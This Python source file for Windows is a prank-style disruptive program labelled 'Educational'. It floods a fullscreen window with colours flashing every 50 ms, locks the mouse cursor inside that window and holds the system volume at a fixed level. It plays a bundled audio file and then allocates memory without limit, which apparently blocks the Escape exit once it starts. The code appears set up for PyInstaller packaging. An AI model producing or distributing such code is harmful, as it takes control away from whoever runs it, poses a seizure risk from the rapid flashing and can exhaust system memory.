import tkinter as tk
import random
import threading
import time
import psutil
import pygame
import sys
import os

import win32api
import win32gui
from ctypes import POINTER, cast
from comtypes import CLSCTX_ALL
from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume

# --- Mouse Lock ---
def trap_mouse(hwnd):
    rect = win32gui.GetWindowRect(hwnd)
    print(f"[DEBUG] Trapping mouse to: {rect}")
    win32api.ClipCursor(rect)

def release_mouse():
    print("[DEBUG] Releasing mouse")
    win32api.ClipCursor(None)

# --- Volume Lock ---
def lock_volume_loop(stop_event, level=0.5):
    devices = AudioUtilities.GetSpeakers()
    interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
    volume = cast(interface, POINTER(IAudioEndpointVolume))
    while not stop_event.is_set():
        volume.SetMasterVolumeLevelScalar(level, None)
        time.sleep(0.5)

# --- CPU Logging ---
def log_cpu_usage(stop_event):
    while not stop_event.is_set():
        print(f"[CPU] Usage: {psutil.cpu_percent()}%")
        time.sleep(1)

# --- RAM Overload ---
def overload_ram():
    big_list = []
    try:
        print("[RAM] Starting to allocate large memory chunks...")
        while True:
            big_list.append([0] * 10_000_000)  # ~80MB chunks depending on Python build
            print(f"[RAM] Allocated chunk #{len(big_list)}")
            time.sleep(0.5)
    except MemoryError:
        print("[RAM] Memory limit reached! Stopping allocation.")

# --- Audio Playback ---
def play_audio(path):
    pygame.mixer.init()
    pygame.mixer.music.load(path)
    pygame.mixer.music.play()

def resource_path(relative_path):
    """ Get absolute path to resource, works for dev and for PyInstaller """
    try:
        base_path = sys._MEIPASS
    except Exception:
        base_path = os.path.abspath(".")
    return os.path.join(base_path, relative_path)

# --- Main App ---
def start_visual_stress():
    root = tk.Tk()
    root.title("GDI Flash + RAM Overload Demo (Educational)")
    root.attributes("-fullscreen", True)
    canvas = tk.Canvas(root)
    canvas.pack(fill="both", expand=True)

    stop_event = threading.Event()

    def flash():
        color = "#{:06x}".format(random.randint(0, 0xFFFFFF))
        canvas.configure(bg=color)
        root.after(50, flash)

    flash()

    def delayed_trap():
        hwnd = root.winfo_id()
        print(f"[DEBUG] Window handle: {hwnd}")
        trap_mouse(hwnd)

    root.after(100, delayed_trap)

    audio_path = resource_path("bombiran.mp3")
    play_audio(audio_path)

    threading.Thread(target=log_cpu_usage, args=(stop_event,), daemon=True).start()
    threading.Thread(target=lock_volume_loop, args=(stop_event,), daemon=True).start()

    def check_audio_end():
        if not pygame.mixer.music.get_busy():
            print("[DEBUG] Audio finished, starting RAM overload!")
            overload_ram()
        else:
            root.after(1000, check_audio_end)

    root.after(1000, check_audio_end)

    def on_close(event=None):
        print("[DEBUG] Exiting...")
        stop_event.set()
        release_mouse()
        pygame.mixer.music.stop()
        pygame.quit()
        root.destroy()
        os._exit(0)  # Force exit

    root.bind_all("<Escape>", on_close)
    root.protocol("WM_DELETE_WINDOW", on_close)
    root.mainloop()

if __name__ == "__main__":
    start_visual_stress()
